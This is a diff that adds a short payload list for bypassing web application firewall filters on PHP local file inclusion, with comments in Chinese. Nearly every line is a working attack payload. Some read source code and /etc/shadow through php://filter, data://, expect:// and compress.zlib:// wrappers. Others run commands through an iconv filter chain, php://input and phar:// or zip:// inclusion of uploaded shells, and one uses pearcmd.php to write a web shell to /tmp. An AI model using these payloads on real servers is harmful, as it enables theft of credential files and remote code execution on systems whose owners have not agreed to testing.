@@ -1,0 +1,20 @@
+# LFI WAF 绕过 - php://filter base64 绕过读取源码
+php://filter/convert.base64-encode/resource=index.php
+# LFI WAF 绕过 - php://filter 链 RCE (iconv filter chain)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1026.UTF16|convert.iconv.L6.UNICODE|convert.iconv.CSIBM037.CSIBM1163|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode/resource=php://temp
+# LFI WAF 绕过 - data:// 封装器绕过
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9zaGFkb3cnKTs/Pg==
+# LFI WAF 绕过 - expect:// 封装器绕过
+expect://cat /etc/shadow
+# LFI WAF 绕过 - compress.zlib:// 封装器绕过路径检测
+compress.zlib://file:///etc/shadow
+# LFI WAF 绕过 - zip:// 封装器绕过
+zip:///var/www/uploads/evil.zip%23shell.php
+# LFI WAF 绕过 - phar:// 反序列化绕过
+phar://uploads/evil.jpg/shell.php
+# LFI WAF 绕过 - php://input 绕过 (POST body 注入)
+# @method: POST
+# @body: <?php system('id');?>
+php://input
+# LFI WAF 绕过 - pearcmd.php RCE
+/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1])?>+/tmp/shell.php
